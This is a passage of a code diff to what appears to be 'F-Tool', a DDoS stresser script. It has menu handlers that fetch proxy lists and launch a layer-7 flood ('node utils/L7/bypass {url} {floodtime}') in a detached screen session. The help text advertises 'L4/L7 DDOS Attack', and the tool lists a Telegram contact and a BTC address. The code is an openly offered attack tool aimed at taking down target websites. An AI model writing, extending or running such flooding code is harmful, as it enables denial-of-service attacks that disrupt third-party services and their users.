+					with open("utils/http.txt", 'w') as p:
+						p.write(httpx.get(http_proxy).text)
+					subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
+					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+				except:
+					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+			elif option == 'ref' or option == 'REF':
 				self.l7()
-			elif option in ['home', 'HOME']:
+			elif option == 'home' or option == 'HOME':
 				F_Tool.home()
-			elif option in ['clear', 'CLEAR']:
+			elif option == 'clear' or option == 'CLEAR':
 				os.system('clear')
 				self.l7()
-			elif option in ['help', 'HELP', '?']:
+			elif option == 'help' or option == 'HELP':
 				print(self.help)
-			elif option in ['dev', 'DEV']:
+			elif option == 'dev' or option == 'DEV':
 				print(self.dev)
-			elif option in ['exit', 'EXIT']:
+			elif option == 'exit' or option == 'EXIT':
 				subprocess.run(['pkill -f F-Tool.py'], shell=True)
-			elif option in ['stop', 'STOP']:
+			elif option == 'stop' or option == 'STOP':
 				subprocess.run(['pkill screen'], shell=True)
 				print(f"{Color.LG} [!] Attack Stopped!")
-			elif option in ['00', '0']:
+			elif option == '00' or option == '0':
 				os.system('clear');self.bbos()
-			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
-				os.system('clear');Tool.bbos()
 			elif option == "":
 				pass
 			else:
 				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
 
-def soon():
-	pass
 
 def spoof_useragents():
 	spoof_ip = []
@@ -698,7 +704,8 @@ def main():
 		os.remove(f'{__file__}')
 		script = False
 	if script == False:sys.exit()
-	else:F_Tool.home()
+	else:pass
+	F_Tool.home()
 
 
 if __name__ == '__main__':
@@ -706,12 +713,10 @@ if __name__ == '__main__':
 {Color.LC}REF{Color.LR} ~> {Color.LY}Refresh the menu
 {Color.LC}CLEAR{Color.LR} ~> {Color.LY}Clear your face xd
 {Color.LC}EXIT{Color.LR} ~> {Color.LY}Exit the program
-{Color.LC}BBOS{Color.LR} ~> {Color.LY}L4/L7 DDOS Attack
 {Color.LC}STOP{Color.LR} ~> {Color.LY}Stop your Attack
 {Color.LC}DEV{Color.LR} ~> {Color.LY}Contact/Support dev"""
 	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/FDc0d3
 {Color.LC}New[BTC]Address{Color.LR}: {Color.LY}32FGCnt4uwkkByWuH8V4qyCSfynm1iVsmB"""
 	F_Tool = Home(commands, dev)
 	Tool = Tool(commands, dev, spoof_useragents())
-	try:open('F-Tool.py');main()
-	except:quit()
+	main()
